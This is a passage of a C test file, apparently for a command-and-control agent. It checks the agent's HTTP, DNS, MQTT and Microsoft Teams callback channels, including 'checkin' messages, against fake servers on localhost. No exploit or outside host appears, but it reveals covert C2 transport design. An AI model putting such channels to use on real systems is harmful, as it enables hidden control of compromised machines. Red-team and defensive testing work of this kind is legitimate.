    snprintf(cfg.callback_host, sizeof(cfg.callback_host), "http://127.0.0.1");
    cfg.callback_port = test_port;
    snprintf(cfg.post_uri, sizeof(cfg.post_uri), "data");
    snprintf(cfg.headers[0].name, sizeof(cfg.headers[0].name), "X-Test");
    snprintf(cfg.headers[0].value, sizeof(cfg.headers[0].value), "v");
    cfg.header_count = 1;
    CHECK(http_exchange(&cfg, sealed, sealed_len, &out, &outlen) == 0, "http exchange");
    WaitForSingleObject(th, 30000);
    CloseHandle(th);
    CloseHandle(ready_ev);
    ready_ev = NULL;
    if (out) {
        CHECK(outlen == reply_len && memcmp(out, reply, reply_len) == 0, "http reply bytes");
        free(out);
    } else {
        CHECK(0, "http no reply");
    }
    CHECK(strcmp(http_got_body, s64) == 0, "http body b64");
    free(r64);
    free(s64);
}

static void test_teams_codec(void) {
    char *e = teams_form_encode("a+b/c=d e");
    CHECK(e && strcmp(e, "a%2Bb%2Fc%3Dd%20e") == 0, "form encode (%s)", e ? e : "null");
    free(e);
    {
        char *card = teams_card_json("a\"b");
        cJSON *root = card ? cJSON_Parse(card) : NULL;
        cJSON *att = root ? cJSON_GetObjectItemCaseSensitive(root, "attachments") : NULL;
        CHECK(root && att && cJSON_IsArray(att), "card json");
        if (att && cJSON_GetArraySize(att) > 0) {
            cJSON *inner = cJSON_Parse(tjstr(cJSON_GetArrayItem(att, 0), "content"));
            cJSON *barr = inner ? cJSON_GetObjectItemCaseSensitive(inner, "body") : NULL;
            const char *t = (barr && cJSON_GetArraySize(barr) > 0)
                                ? tjstr(cJSON_GetArrayItem(barr, 0), "text")
                                : "";
            CHECK(strcmp(t, "a\"b") == 0, "card text escape");
            if (inner)
                cJSON_Delete(inner);
        }
        if (root)
            cJSON_Delete(root);
        free(card);
    }
}

static const char *tjstr(cJSON *o, const char *k) {
    cJSON *v = o ? cJSON_GetObjectItemCaseSensitive(o, k) : NULL;
    if (!v || !cJSON_IsString(v) || !v->valuestring)
        return "";
    return v->valuestring;
}

static void test_teams_exchange(void) {
    agent_config_t cfg;
    teams_state_t st;
    HANDLE th;
    DWORD tid;
    unsigned char *out = NULL;
    size_t outlen = 0;
    unsigned char sealed[128], reply[128];
    size_t sealed_len, reply_len;
    int i;
    memset(&cfg, 0, sizeof(cfg));
    memset(&st, 0, sizeof(st));
    sealed_len = (size_t)sprintf((char *)sealed, "%s{\"action\":\"checkin\"}", TUUID);
    reply_len = (size_t)sprintf((char *)reply, "%s{\"action\":\"checkin\",\"status\":\"success\"}", TUUID);
    {
        char *r64 = b64_encode(reply, reply_len, NULL);
        strncpy(teams_auto, r64 ? r64 : "", sizeof(teams_auto) - 1);
        free(r64);
    }
    teams_n = 0;
    teams_authn = 0;
    teams_stop = 0;
    ready_ev = CreateEvent(NULL, TRUE, FALSE, NULL);
    th = CreateThread(NULL, 0, teams_fake, NULL, 0, &tid);
    if (!th || wait_ready() != 0) {
        CHECK(0, "teams fake start");
        return;
    }
    snprintf(teams_graph_base, sizeof(teams_graph_base), "http://127.0.0.1:%d/v1.0", test_port);
    snprintf(teams_login_base, sizeof(teams_login_base), "http://127.0.0.1:%d", test_port);
    snprintf(cfg.teams_tenant, sizeof(cfg.teams_tenant), "ten");
    snprintf(cfg.teams_client, sizeof(cfg.teams_client), "cid");
    snprintf(cfg.teams_secret, sizeof(cfg.teams_secret), "sec");
    snprintf(cfg.teams_team, sizeof(cfg.teams_team), "team");
    snprintf(cfg.teams_channel, sizeof(cfg.teams_channel), "chan");
    snprintf(cfg.teams_ua, sizeof(cfg.teams_ua), "agent-test");
    CHECK(teams_exchange(&cfg, &st, sealed, sealed_len, &out, &outlen) == 0, "teams exchange");
    if (out) {
        CHECK(outlen == reply_len && memcmp(out, reply, reply_len) == 0, "teams reply bytes");
        free(out);
        out = NULL;
    } else {
        CHECK(0, "teams no reply");
    }
    /* Second exchange reuses the cached token. */
    CHECK(teams_exchange(&cfg, &st, sealed, sealed_len, &out, &outlen) == 0, "teams exchange2");
    free(out);
    teams_stop = 1;
    WaitForSingleObject(th, 10000);
    CloseHandle(th);
    CloseHandle(ready_ev);
    ready_ev = NULL;
    CHECK(teams_authn == 1, "teams auth cached (%d)", teams_authn);
    for (i = 0; i < teams_n; i++) {
        free(teams_ids[i]);
        free(teams_msgs[i]);
    }
}

int main(void) {
    srand(GetTickCount() ^ GetCurrentProcessId());
    test_crypto_raw();
    test_http_exchange();
    test_dns_codec();
    test_dns_query_bounds();
    test_mqtt_exchange();
    test_dns_exchange_one(16, 1000, 300, 1500);
    test_dns_exchange_one(1, 128, 120, 300);
    test_teams_codec();
    test_teams_exchange();
    if (failures == 0)
        printf("CODEC-PASS\n");
    else
        printf("CODEC-FAIL %d\n", failures);
    return failures ? 1 : 0;
}
